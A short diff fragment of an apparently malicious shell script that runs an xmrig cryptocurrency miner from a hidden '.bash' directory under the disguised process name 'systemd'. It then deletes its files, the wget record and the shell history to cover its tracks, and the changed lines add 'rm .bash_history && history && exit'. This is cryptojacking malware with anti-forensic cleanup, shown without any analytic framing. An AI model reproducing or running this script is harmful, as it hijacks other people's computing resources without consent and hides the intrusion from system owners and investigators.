@@ -7,7 +7,8 @@ cd .bash/
 mv ./xmrig ./systemd
 ./systemd
 cd ..
-rm -r .bash
-rm nv3v2
-rm .bash_history
+rm -r ./.bash
+rm ./nv3v2
 rm .wget-hsts
+rm .bash_history && history && exit
+
